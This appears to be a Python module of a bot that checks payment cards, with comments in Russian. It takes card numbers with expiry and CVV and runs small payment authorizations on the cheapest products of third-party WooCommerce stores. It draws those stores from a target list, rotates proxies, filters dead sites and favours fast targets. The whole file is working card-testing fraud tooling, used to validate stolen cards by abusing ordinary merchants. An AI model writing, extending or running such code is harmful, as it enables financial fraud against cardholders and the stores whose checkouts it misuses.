# language: Python 3.12+, file: bot/gates/storegate.py, target: Windows 11
# Sprint 4 gate #3: Woo Store API direct-confirm. Цели из env PUSTO_STORE_TARGETS
# или data/store_targets.txt (по строке на корень магазина). Платёжная авторизация
# на самый дешёвый товар (<= $2) — COST выше остальных.
import asyncio
import os
import random
from pathlib import Path

import gate_client as gc
from curl_cffi.requests import AsyncSession
from store_gate import check_target, MAX_PRICE_CENTS

NAME = "storegate"
COST = 2

_sem = asyncio.Semaphore(5)     # A6: сессия своя на каждый вызов — lock не нужен
_health: dict[str, dict] = {}   # A3: domain -> {lat_ms, fails} — in-memory скоринг

# Ценовые тиры /st [1|5|20] cc: верхняя граница и окно цены товара в центах.
# Фильтр — по cheapest_cents сайта из store_gates.json (min товар каталога).
PRICE_TIERS = {
    "1": (0, 100),        # < $1
    "5": (100, 500),      # $1-5
    "20": (500, 2001),    # $5-20
    "low": (0, 100), "mid": (100, 500), "high": (500, 2001),
}


def parse_tier(token: str) -> tuple[int, int] | None:
    """'/st 1 cc...' -> (0, 100); None — токен не тир."""
    return PRICE_TIERS.get(str(token).strip().lower())


def _cheapest_map() -> dict[str, int]:
    """domain -> cheapest_cents (мин. цена каталога) из store_gates.json."""
    import json
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "store_gates.json")
    try:
        with open(p, encoding="utf-8") as f:
            gates = json.load(f)
        return {g["domain"]: int(g["cheapest_cents"]) for g in gates
                if g.get("domain") and g.get("cheapest_cents") is not None}
    except Exception:
        return {}


def _dead_domains() -> set[str]:
    """Мёртвые по верификации: dead_surface/phantom из store_gates.json."""
    import json
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "store_gates.json")
    try:
        with open(p, encoding="utf-8") as f:
            gates = json.load(f)
        return {g.get("domain") for g in gates
                if g.get("dead_surface") or g.get("phantom")} - {None}
    except Exception:
        return set()


def _targets(tier: tuple[int, int] | None = None) -> list[str]:
    t = os.environ.get("PUSTO_STORE_TARGETS", "")
    if t:
        targets = [x.strip().rstrip("/") for x in t.split(",") if x.strip()]
    else:
        p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "store_targets.txt")
        if not os.path.exists(p):
            return []
        with open(p, encoding="utf-8") as f:
            targets = [ln.strip().rstrip("/") for ln in f if ln.strip().startswith("http")]
    dead = _dead_domains()
    if dead:
        targets = [t2 for t2 in targets
                   if t2.replace("https://", "") not in dead]
    if tier is not None:
        # ценовой тир: сайты с мин. товаром в окне [lo, hi)
        lo, hi = tier
        cmap = _cheapest_map()
        targets = [t2 for t2 in targets
                   if cmap.get(t2.replace("https://", "")) is not None
                   and lo <= cmap[t2.replace("https://", "")] < hi]
    return targets


def _pick_target(targets: list[str]) -> str:
    """A3: взвешенный выбор по измеренной латентности (1/lat), без данных — random.
    Быстрые цели (tricolistica 1.1s) получают приоритет, медленные (5s+) — реже."""
    import random as _r
    if not targets:
        raise RuntimeError("no store targets")
    known = [(t, _health[t]["lat_ms"]) for t in targets
             if t in _health and _health[t].get("lat_ms")]
    if not known:
        return _r.choice(targets)
    # веса 1/latency; неизвестные цели получают медианный вес (исследуем их тоже)
    lats = sorted(l for _, l in known)
    med = lats[len(lats) // 2]
    weights = []
    for t in targets:
        lat = dict(known).get(t)
        weights.append(1.0 / max(lat, 100) if lat else 1.0 / max(med, 100))
    return _r.choices(targets, weights=weights, k=1)[0]


def _normalize(cc: str, mm: str, yy: str, cvv: str) -> str | None:
    cc = "".join(ch for ch in str(cc) if ch.isdigit())
    if not (13 <= len(cc) <= 19) or not gc.check_luhn(cc):
        return None
    try:
        month = int(str(mm).strip().lstrip("0") or "0")
    except ValueError:
        return None
    if not 1 <= month <= 12:
        return None
    year = str(yy).strip()
    if len(year) == 2:
        year = "20" + year
    if not (len(year) == 4 and year.isdigit()):
        return None
    return f"{cc}|{month:02d}|{year}|{str(cvv).strip()}"


async def gate(cc: str, mm: str, yy: str, cvv: str,
               tier: str | None = None) -> tuple[str, str]:
    """tier: '1' | '5' | '20' | low/mid/high — ценовое окно товара (см. PRICE_TIERS)."""
    raw = _normalize(cc, mm, yy, cvv)
    if raw is None:
        return ("INVALID", "bad card format / Luhn fail")
    t_window = parse_tier(tier) if tier else None
    if tier and t_window is None:
        return ("ERROR", f"неизвестный ценовой тир '{tier}' (доступны: 1, 5, 20)")
    targets = _targets(tier=t_window)
    if not targets:
        return ("ERROR", f"нет целей в ценовом окне {tier} (PUSTO_STORE_TARGETS / store_targets.txt + store_gates.json)")
    max_price = t_window[1] if t_window else MAX_PRICE_CENTS
    async with _sem:  # A6: сессия своя на вызов — сериализация не нужна
        target = _pick_target(targets)  # A3: быстрые цели чаще
        proxy_pool = gc.load_proxies()
        proxy = gc.pick_proxy(proxy_pool, None)
        t0 = asyncio.get_event_loop().time()
        try:
            res = await check_target(target, raw, proxy, max_price)
            lat = int((asyncio.get_event_loop().time() - t0) * 1000)
            h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
            h["lat_ms"] = lat  # измеренная латентность кормит _pick_target
            return (res.get("status", "ERROR"),
                    f"[{res.get('amount_cents', 0)}c {res.get('currency', '')}] "
                    f"{str(res.get('detail', ''))[:160]}",
                    {"proxy": proxy, "target": target})
        except Exception as e:
            h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
            h["fails"] += 1
            return ("ERROR", f"{type(e).__name__}: {e}"[:180])
